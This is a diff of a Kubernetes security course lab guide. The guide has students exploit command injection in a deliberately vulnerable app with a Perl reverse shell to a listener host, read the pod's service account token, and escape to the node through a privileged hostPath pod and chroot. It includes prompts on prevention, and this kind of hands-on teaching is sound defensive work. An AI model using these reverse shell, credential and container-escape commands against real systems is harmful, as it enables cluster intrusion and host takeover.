@@ -1,26 +1,24 @@
-https://www.revshells.com/
-
-# On the host that listen (i.e. 192.168.1.184)
-nc -lvnp 8080
-
-# On the remote host : 
-perl -e 'use Socket;$i="192.168.1.184";$p=8080;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("sh -i");};'
-
-# Get the vuln kubernetes repository on github
+# Get the vulnerable kubernetes repository on github
 
 ```
 git clone  git@github.com:acombe/kubernetes-security-course.git
 ```
 
-# Build and push the vuln_node application in the k3s registry
+# Build and push the "vulnnode" application in the k3s registry
 
 ```
 docker-compose build; # (-f docker-compose-host-network.yml on wsl hosts)
 docker-compose push;
 ```
 
-# Deploy vuln_node pod on the cluster
+# Deploy vulnnode pod on the cluster
 
+Create the infres namespace
+ ```
+kubectl create namespace infres
+```
+
+Deploy the vulnnode application on it 
 ```
 kubectl apply -f k8s/Vulnnode.yaml
 ```
@@ -29,9 +27,90 @@ Add vuln_node.infress.fr hostname to /etc/hosts for DNS resolution :
 
 ```
 sudo su -
-echo "$(hostname -I | awk '{print $1}') vulnnode.infres.fr" >> /etc/hosts
+export MYIP=$(hostname -I | awk '{print $1}')
+echo "$MYIP vulnnode.infres.fr" >> /etc/hosts
 ```
 
 On WSL, modify the C:\Windows\System32\Drivers\etc\hosts file by adding the following entry : 
-127.0.0.1       vulnnode.infres.fr
+$MYIP       vulnnode.infres.fr
 
+# Test that the pod is correctly working
+
+Go to ```http://vulnnode.infres.fr/lookup.html```, type "google.com" within the form and validate with post button => The result of the DNS resolution should appear 
+
+# Enter the system by exploiting an application vulnerability 
+
+Go to https://www.revshells.com/ an try to find a reverse shell that match the command injection issue within the application 
+
+** What could had been done to prevent this issue ? **
+
+# On the host that listen to the reverse shell (i.e. 192.168.1.184)
+nc -lvnp 8080
+
+# On the remote host or on a "command injection" vulnerable application, inject the following revereshell : 
+perl -e 'use Socket;$i="192.168.1.184";$p=8080;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("sh -i");};'
+
+(once the revershell validated, just connect normaly into the pod via kubect exe to be more comfortable an stable with bash commands)
+
+# Once inside the container 
+
+As you can see, you're not root on the pod and there is nothing clear to escape the container.
+Try to see how you can laterize and create k8s components that could have more rights for example by using rights that the current pod itself has one the cluster.
+
+Get kubectl on the pod (thanks to https://github.com/nmeisenzahl/hijack-kubernetes/blob/main/docs/hands-on.md)
+```
+cd /tmp
+curl -LO "https://dl.k8s.io/release/$(curl -L -s https://dl.k8s.io/release/stable.txt)/bin/linux/amd64/kubectl"
+chmod +x kubectl;
+```
+
+Export token of the SA
+```
+export TOKEN=$(echo /var/run/secrets/kubernetes.io/serviceaccount/token)
+export CA=/var/run/secrets/kubernetes.io/serviceaccount/ca.crt
+```
+
+See what can be done with this SA
+```
+kubectl auth can-i create pod
+```
+
+** What could had been done to prevent this issue ? **
+
+* Run a priviledged pod on the cluster (thanks to https://github.com/BishopFox/badPods/tree/main/manifests/everything-allowed)
+```
+cd /tmp/
+cat <<EOF | ./kubectl apply -f -
+apiVersion: v1
+kind: Pod
+metadata:
+  name: everything-allowed-exec-pod
+  namespace: infres
+spec:
+  hostNetwork: true
+  hostPID: true
+  hostIPC: true
+  containers:
+  - name: everything-allowed-pod
+    image: ubuntu
+    securityContext:
+      privileged: true
+    volumeMounts:
+    - mountPath: /host
+      name: noderoot
+    command: [ "/bin/sh", "-c", "--" ]
+    args: [ "while true; do sleep 3000; done;" ]
+  #nodeName: if you have the controle node name, try to instanciate the pod there
+  volumes:
+  - name: noderoot
+    hostPath:
+      path: /
+EOF
+```
+
+* Connect to the node by chrooting directly on the root path of the host 
+ ```
+ ./kubectl exec -it everything-allowed-exec-pod -- chroot /host bash
+ ```
+
+ ** What could had been done to prevent this issue ? **
